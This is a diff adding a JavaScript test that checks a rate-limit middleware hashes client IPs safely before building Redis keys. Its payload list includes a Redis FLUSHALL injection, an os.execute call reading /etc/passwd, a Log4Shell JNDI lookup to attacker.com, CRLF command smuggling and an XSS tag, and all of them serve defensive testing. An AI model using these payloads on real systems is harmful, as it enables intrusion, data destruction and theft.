@@ -94,3 +94,45 @@ test("returns 503 when the Upstash and Arcjet fallback both fail", async () => {
 
   assert.equal(response.statusCode, 503);
 });
+
+test("hostile code injection payloads in req.ip are safely SHA-256 hashed and cannot alter Lua script or execute code", async () => {
+  const hostilePayloads = [
+    '"; redis.call("FLUSHALL"); --',
+    '127.0.0.1; eval("os.execute(\'cat /etc/passwd\')")',
+    '${jndi:ldap://attacker.com/a}',
+    '127.0.0.1\r\nSET hijacked 1',
+    '<script>alert(1)</script>',
+    '\x00\x00\x00\x00',
+  ];
+
+  for (const hostileIp of hostilePayloads) {
+    let capturedKey = null;
+    let capturedScript = null;
+
+    const middleware = createRateLimitMiddleware({
+      redisClient: {
+        eval: async (script, numkeys, key, windowMs) => {
+          capturedScript = script;
+          capturedKey = key;
+          return 1;
+        },
+      },
+      fallbackRateLimiter: { protect: async () => ({ isDenied: () => false }) },
+      logger: createLogger(),
+    });
+
+    let nextCalled = false;
+    await middleware({ ip: hostileIp }, createResponse(), () => { nextCalled = true; });
+
+    assert.equal(nextCalled, true, "Middleware continues when count is under limit");
+    // Verify key format: strictly matches let-connect:api-rate-limit:<64 hex chars>
+    assert.match(
+      capturedKey,
+      /^let-connect:api-rate-limit:[0-9a-f]{64}$/,
+      `Hostile IP ${hostileIp} must be strictly hashed into a 64-character hex digest`,
+    );
+    // Verify script is unchanged static Lua constant
+    assert.ok(capturedScript.includes('local count = redis.call("INCR", KEYS[1])'));
+    assert.ok(!capturedScript.includes(hostileIp), "Hostile payload must never be injected into script body");
+  }
+});
